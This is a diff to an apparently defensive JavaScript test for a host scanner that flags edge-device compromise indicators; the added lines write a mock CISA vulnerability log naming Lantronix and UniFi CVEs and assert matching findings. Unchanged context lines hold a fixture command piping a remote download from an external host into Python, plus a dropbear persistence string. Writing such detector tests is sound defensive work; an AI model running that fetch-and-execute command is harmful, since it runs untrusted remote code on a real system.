@@ -618,6 +618,12 @@ function run() {
     "dropbear started on port 2332 via iptables rule",
     "curl -skL https://hgodpcx.auq8.com/t | python"
   ].join("\n"));
+  write(path.join(root, "var", "log", "cisa-kev-edge-2026-06-23.txt"), [
+    "CISA Known Exploited Vulnerabilities catalogVersion 2026.06.23 BOD 26-04 Forensics Triage Requirements",
+    "Lantronix EDS5000 EDS5008 EDS5016 EDS5032 CVE-2025-67038 code injection vulnerability username parameter root privileges",
+    "Ubiquiti UniFi OS Security Advisory Bulletin-064 CVE-2026-34908 improper access control",
+    "UniFi OS CVE-2026-34909 path traversal and CVE-2026-34910 command injection",
+  ].join("\n"));
 
   const report = scanHost({ targetRoot: root, homePath: home, architecture: "aarch64" });
   const ids = new Set(report.findings.map((finding) => finding.id));
@@ -813,6 +819,10 @@ function run() {
   assert(ids.has("arystinger-edge-proxy-indicator"));
   assert(ids.has("arystinger-dropbear-2332-persistence"));
   assert(ids.has("arystinger-downloader-command"));
+  assert(ids.has("cisa-kev-edge-device-cve-reference"));
+  assert(ids.has("cisa-kev-lantronix-eds5000-review"));
+  assert(ids.has("cisa-kev-unifi-os-review"));
+  assert(ids.has("cisa-kev-edge-device-text-indicator"));
   const tokenFinding = report.findings.find((finding) => finding.id === "dynatrace-token-exposure");
   assert(tokenFinding.evidence.includes("dt0c01.ABCDEFGHIJKLMNOPQRSTUVWX.<redacted>"));
   assert(!tokenFinding.evidence.includes("ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ"));
